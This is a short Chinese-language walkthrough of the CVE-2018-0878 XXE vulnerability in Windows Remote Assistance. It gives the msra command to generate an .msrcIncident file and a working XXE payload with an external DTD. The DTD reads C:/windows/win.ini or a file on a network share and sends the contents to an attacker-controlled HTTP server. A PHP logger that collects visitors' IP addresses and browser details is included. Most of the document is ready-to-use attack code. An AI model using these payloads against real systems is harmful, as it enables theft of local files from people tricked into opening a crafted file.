CVE: CVE-2018-0878

POC: https://www.exploit-db.com/exploits/44352/

1、使用msra生成一个远程协助文件

```
msra /saveasfile c:\test\1.msrcIncident 123456789012
```

编辑文件内容，替换为payload


2、payload内容如下


```
<?xml version="1.0" encoding="UTF-8" ?>  
<!DOCTYPE zsl [  
<!ENTITY % remote SYSTEM "http://192.168.62.131:8080/xxe.xml">  
%remote;%root;%oob;]>
```

**注：**

192.168.62.131为测试服务器，可使用kali linux，建立httt服务器的命令如下：

```
python -m SimpleHTTPServer 8080
```

kali linux目录下创建文件xxe.xml，内容如下：

```
<!ENTITY % payload SYSTEM "file:///C:/windows/win.ini">  
<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://192.168.62.131:8080/?%payload;'> ">  
```

**注：**

%对应的HTML字符实体的十进制表示为&#37，十六进制表示为&#x25，所以说xxe.xml也可改成如下格式：

```
<!ENTITY % payload SYSTEM "file:///C:/windows/win.ini">  
<!ENTITY % root "<!ENTITY &#x25; oob SYSTEM 'http://192.168.62.131:8080/?%payload;'> ">  
```

payload为读取文件`C:/windows/win.ini`并发送到测试服务器

3、将修改后的1.msrcIncident在另一个测试windows系统下双击打开

弹框提示文件出错，此时payload执行，测试服务器获得文件`C:/windows/win.ini`内容

4、其他可用payload

(1) 访问文件共享中的文件内容：

```
<!ENTITY % payload SYSTEM "file:////192.168.62.130/1/test.txt">  
<!ENTITY % root "<!ENTITY &#x25; oob SYSTEM 'http://192.168.62.131:8080/?%payload;'> ">  
```

(2) 访问web

获得当前系统ip

统计浏览器信息，操作系统，ip的php实现代码：

```
<?php
$data=$_SERVER['HTTP_USER_AGENT'].";".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 5).";".$_SERVER["REMOTE_ADDR"]."\r\n";
echo $data;
file_put_contents("log.txt",$data,FILE_APPEND);
?>
```

命令执行：

	略

内网探测：

	略

SSRF：

	略
